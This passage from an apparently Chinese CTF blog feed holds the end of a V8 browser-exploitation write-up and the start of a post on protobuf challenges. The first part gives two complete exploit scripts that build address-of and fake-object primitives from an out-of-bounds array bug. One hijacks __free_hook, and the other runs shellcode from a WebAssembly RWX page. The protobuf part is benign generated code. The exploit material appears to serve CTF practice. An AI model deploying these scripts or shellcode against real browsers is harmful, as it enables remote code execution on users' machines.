class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span>, (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = arbitrary_read(address_of(a.constructor) + <span class="number">0x30n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;code_addr =&gt; 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> v8_addr = arbitrary_read(code_addr + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> v8_base = v8_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;v8_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> free_got_addr = v8_base + <span class="number">0x12aa8b8n</span>;</span><br><span class="line"><span class="keyword">var</span> free_addr = arbitrary_read(free_got_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base = free_addr - <span class="number">0x9a6d0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;libc_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> __free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, system_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;gnome-calculator\x00&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627183627029.png"                      alt="image-20230627183627029"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span> + (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>, <span class="number">0x62792eb848500101n</span>, <span class="number">0x431480101626d60n</span>, <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>, <span class="number">0x1010101010101b8n</span>, <span class="number">0x6d606279b8485001n</span>, <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>, <span class="number">0x313b68e6894856e6n</span>, <span class="number">0x101012434810101n</span>, <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>, <span class="number">0x894852e201485a08n</span>, <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(sc_arr.length * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">        data_view.setFloat64(i * <span class="number">8</span>, i2f(value[i]), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> pwn = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pwn_addr = address_of(pwn);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;pwn_addr =&gt; 0x&quot;</span> + pwn_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbitrary_read(pwn_addr - <span class="number">1n</span> + <span class="number">0x18n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;shared_info_addr =&gt; 0x&quot;</span> + shared_info_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> data_addr = arbitrary_read(shared_info_addr - <span class="number">1n</span> + <span class="number">0x8n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;data_addr =&gt; 0x&quot;</span> + data_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> instance_addr = arbitrary_read(data_addr - <span class="number">1n</span> + <span class="number">0x10n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;instance_addr =&gt; 0x&quot;</span> + instance_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> rwx_addr = arbitrary_read(instance_addr - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;rwx_addr =&gt; 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line">arbitrary_write(rwx_addr, sc_arr);</span><br><span class="line"></span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627195354273.png"                      alt="image-20230627195354273"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这段事情因为各种事情耽搁，一直没有更新文章。本打算新的一篇出&lt;code&gt;rootkit&lt;/code&gt;来水一篇，后面发现a3佬写的太多了，不想</summary>
      
    
    
    
    <category term="chrome-pwn" scheme="https://cv196082.gitee.io/categories/chrome-pwn/"/>
    
    
    <category term="overstep" scheme="https://cv196082.gitee.io/tags/overstep/"/>
    
  </entry>
  
  <entry>
    <title>关于protobuf的解题步骤</title>
    <link href="https://cv196082.gitee.io/2023/05/30/protobuf/"/>
    <id>https://cv196082.gitee.io/2023/05/30/protobuf/</id>
    <published>2023-05-30T08:26:30.000Z</published>
    <updated>2023-05-30T08:28:07.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实在以前已经多次遇见过<code>protobuf</code>了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所以也导致我一直没有去真正做过这样的题，这次国赛第一天恰好出现了这样一道题，不出意外没能解出来，如果不看wp我可能还会怀疑自己的逆向能力，因为我蠢到看了几个小时的1200多行代码。最可恶的是当初不想玩web的一大原因就是我比较粗心大意，面对信息收集时往往会忽略掉重要信息，但是现在的pwn也越来越往这个方向靠了。不可否认的是，这提升了选手的综合实力(<del>恶心选手</del>)，只是我不太能接受从一个坑又跳到了另外一个坑里面去了。不过，需要认清现实的是我的逆向水平确实很差，我也准备开始刷逆向题了。</p><h2 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h2><h3 id="什么是protobuf"><a href="#什么是protobuf" class="headerlink" title="什么是protobuf"></a>什么是protobuf</h3><p>Protocol Buffers，是Google公司开发的一种数据描述语言，类似于XML能够将结构化数据序列化，可用于数据存储、通信协议等方面。它不依赖于语言和平台并且可扩展性极强。</p><p>同XML相比，Protocol buffers在序列化结构化数据方面有许多优点：</p><ol><li>  更简单</li><li>  数据描述文件只需原来的1/10至1/3</li><li>  解析速度是原来的20倍至100倍</li><li>  减少了二义性</li><li>  生成了更容易在编程中使用的数据访问</li><li>支持多种编程语言<br>   （转自百度百科）</li></ol><p>这里就不多提了，安装的话自己搜一下就有的。</p><h3 id="使用protobuf"><a href="#使用protobuf" class="headerlink" title="使用protobuf"></a>使用protobuf</h3><p>首先编写一个测试文件<code>test.proto</code></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">int64</span> aaa = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">uint64</span> bbb = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> ccc = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> ddd = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>protoc --c_out=. ./test.proto</code>命令生成对应代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> 1003003 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Test</span> <span class="title">Test</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="keyword">int64_t</span> aaa;</span><br><span class="line">  <span class="keyword">uint64_t</span> bbb;</span><br><span class="line">  <span class="keyword">int64_t</span> ccc;</span><br><span class="line">  ProtobufCBinaryData ddd;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;test__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, 0, 0, &#123;0,NULL&#125; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test methods */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>             *out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer     *buffer)</span></span>;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*Test_Closure)</span></span></span><br><span class="line"><span class="function">                 <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">void</span> *closure_data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* PROTOBUF_C_test_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>这是<code>test.pb-c.h</code>文件，可以看到其中定义了许多的函数，并且定义了结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 